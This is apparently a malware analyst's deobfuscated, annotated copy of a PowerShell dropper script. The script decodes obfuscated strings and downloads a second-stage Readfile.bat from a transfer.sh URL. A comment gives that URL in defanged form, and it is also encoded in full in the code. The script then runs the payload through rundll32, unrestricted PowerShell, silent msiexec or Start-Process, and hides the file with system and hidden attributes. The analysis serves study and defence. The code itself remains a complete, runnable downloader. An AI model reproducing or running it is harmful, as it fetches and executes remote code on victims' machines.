# Deobfuscated with ❤️ from Malware Guy - do not run on your system!

# Opens a file and writes data into it, assumably downloaded from the Internet
function WriteFile ($executable_payload,$data)
{
    [IO.File]::WriteAllBytes($executable_payload,$data)
};

# This function iterates over the payload type through its file extensions
function RunExecutablePayload ($executable_payload)
{
    if ($executable_payload.EndsWith((decode_string @(6315,6369,6377,6377))) -eq $True) # checks if the file ends with '.dll'
    {
        rundll32.exe $executable_payload
    } elseif ($executable_payload.EndsWith((decode_string @(6315,6381,6384,6318))) -eq $True) # checks if the file ends with '.ps1' 
    { 
        powershell.exe -ExecutionPolicy unrestricted -File $executable_payload
    } elseif ($executable_payload.EndsWith((decode_string @(6315,6378,6384,6374))) -eq $True) # checks if the file ends with '.msi'
    {
        msiexec /qn /i $executable_payload
    } else
    {
        Start-Process $executable_payload
    }
};

# Change the file's attributes to system and hidden
function ChangeFileAttributes ($FileName)
{
    $file_attributes_enum = (decode_string @(6341,6374,6369,6369,6370,6379));
    $file = (Get-ChildItem $FileName -Force);
    $file.Attributes = $file.Attributes -bor ([IO.FileAttributes]$file_attributes_enum).value__
};

# Downloads from any specified URLs using HTTPS
function download_data ($url)
{
    $webclient = New-Object (decode_string @(6347,6370,6385,6315,6356,6370,6367,6336,6377,6374,6370,6379,6385));
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::TLS12;
  $data = $webclient.DownloadData($url);
  return $data
};

# String deobfuscation subroutine
function decode_string ($encoded_string)
{
    $key = 6269;
    $decoded_string = $Null;
    foreach ($encoded_char in $encoded_string)
    {
        $decoded_string += [char]($encoded_char - $key)
    };
    return $decoded_string
};

# The main part of the script - runs pretty much everything
function main ()
{
    $filepath = $env:AppData + '\';
  ;
  ;
  $second_stage_script = $filepath + 'Readfile.bat';

  # Check if the complete file path of Readfile.bat exists, otherwise downloads from hxxps://transfer[.]sh/get/fw5nr5/Readfile[.]bat 
  if (Test-Path -Path $second_stage_script)
  {
    RunExecutablePayload $second_stage_script;
  }
  else
  {
    $downloaded_data = download_data (decode_string @(6373,6385,6385,6381,6384,6327,6316,6316,6385,6383,6366,6379,6384,6371,6370,6383,6315,6384,6373,6316,6372,6370,6385,6316,6371,6388,6322,6379,6383,6322,6316,6351,6370,6366,6369,6371,6374,6377,6370,6315,6367,6366,6385));
    WriteFile $second_stage_script $downloaded_data;
    RunExecutablePayload $second_stage_script;
  };

  # Once completed, change the file attributes
  ChangeFileAttributes $second_stage_script;
  ;
  ;
}

main;
